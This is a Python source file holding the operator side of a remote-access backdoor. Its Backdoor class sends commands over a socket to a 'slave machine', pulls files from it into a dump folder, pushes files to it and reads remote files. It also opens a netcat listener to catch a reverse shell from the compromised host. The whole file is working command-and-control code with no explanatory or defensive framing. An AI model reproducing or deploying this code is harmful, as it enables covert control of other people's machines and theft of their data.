from sys import stderr, exit, stderr
from os import system, listdir, fork, wait
from socket import error as socket_error

class Backdoor():

    def __init__(self, conn, ip_addr, port, shell_port, crypto):
        self.conn = conn
        self.ip_addr = ip_addr
        self.port = port
        self.shell_port = shell_port
        self.crypto = crypto

    def get_cmd(self):
        cmd = ""
        while cmd == "":
            cmd = input(">>> ")
        return cmd

    def send_cmd(self, cmd):
        try:
            self.conn.send(cmd.encode())
        except socket_error:
            stderr.write("Error sending command\n")
            exit(0)
            
    def drop_shell(self):
        pid = fork()
        if pid == 0:
            system("clear")
            print("Dropping shell on slave machine ...")
            print("Exit netcat sending SIGINT")
            syscmd = "nc -l " + str(self.shell_port)
            system(syscmd)
        else:
            wait()
        exit(0)

    def builtin_cmds(self, cmd):
        msg = ""
        if cmd[:5] == "shell":
            cmd += str(self.shell_port)
            self.send_cmd(cmd)
            self.drop_shell()
        elif cmd[:5] == "clear":
            system("clear")
            msg = "\n"
        elif cmd[:4] == "exit":
            self.conn.close()
            system("clear")
            print("[*] Connection with %s:%d closed" % (self.ip_addr, self.port))
            print("[*] Gracefully quitting ...")
            exit(0)
        elif cmd[:2] == "dl":
            self.send_cmd(cmd)
            encoded_data = self.conn.recv(64000)
            msg = encoded_data.decode()
            with open("dump/"+str(cmd)[3:], "w") as fp:
                fp.write(msg[3:])
        elif cmd[:2] == "pl":
            self.send_cmd(cmd[:2])
            system("clear")
            for file in listdir():
                print(file)
            filename = input("$ ")
            with open(filename, "r") as fp:
                data = fp.read()
                encoded_data = data.encode()
                self.conn.send(encoded_data)
            msg = "[+] File uploaded to slave machine"
        elif cmd[:3] == "cat":
            filename = cmd[3:]
            try:
                encoded_cmd = cmd.encode()
                self.conn.send(encoded_cmd)
            except socket_error:
                    stderr.write("[x] Error sending command\n")
            try:
                encoded_msg = self.conn.recv(64000)
                msg = encoded_msg.decode()
            except socket_error:
                stderr.write("[x] Error receiving message")
        else:
            self.send_cmd(cmd)
            return msg
        return msg



    def display_response(self, msg):
        if msg == "":
            try:
                encoded_msg = self.conn.recv(1024)
                msg = encoded_msg.decode()
            except socket_error:
                stderr.write("[x] Error receiving message")
            slave_ack = msg[:3]
            msg = msg[3:]
            if slave_ack != "ACK":
                stderr.write("[x] Slave did not acknowledge the command\n")
            elif msg[:3] == "404":
                print("Error message from slave: %s" % (msg[3:]))
            else:
                print(msg)
        else:
            print(msg)

    def cmd_shell(self):
        while True:
            cmd = self.get_cmd()
            msg = self.builtin_cmds(cmd)
            self.display_response(msg)

